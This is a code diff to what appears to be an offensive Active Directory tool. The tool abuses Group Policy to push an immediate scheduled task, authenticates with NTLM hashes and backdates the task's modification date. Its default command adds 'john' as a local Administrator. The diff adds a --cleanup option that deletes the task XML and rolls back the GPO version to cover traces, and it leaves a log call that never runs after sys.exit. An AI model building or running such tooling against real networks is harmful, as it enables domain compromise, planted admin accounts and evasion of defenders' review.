@@ -27,6 +27,7 @@ parser.add_argument('-taskname', action='store', help='Taskname to create. (Defa
 parser.add_argument('-mod-date', action='store', help='Task modification date (Default: 30 days before)')
 parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
 parser.add_argument('-description', action='store', help='Task description (Default: Empty)')
+parser.add_argument('--cleanup', action='store_true', help='Delete the Immediate‑Task XML and roll back the GPO version')
 parser.add_argument('-powershell', action='store_true', help='Use Powershell for command execution')
 parser.add_argument('-command', action='store',
                     help='Command to execute (Default: Add john:H4x00r123.. as local Administrator)')
@@ -118,6 +119,20 @@ except Exception as e:
 
 try:
     gpo = GPO(smb_session)
+
+    if options.cleanup:
+        ok = gpo.rollback_scheduled_task(
+                domain=domain,
+                gpo_id=options.gpo_id,
+                gpo_type="user" if options.user else "computer")
+        if ok:
+            sys.exit(0)
+            logging.info("cleanup successful")
+        else:
+            logging.error("Error while updating versions")
+            sys.exit(1)
+
+
     task_name = gpo.update_scheduled_task(
         domain=domain,
         gpo_id=options.gpo_id,
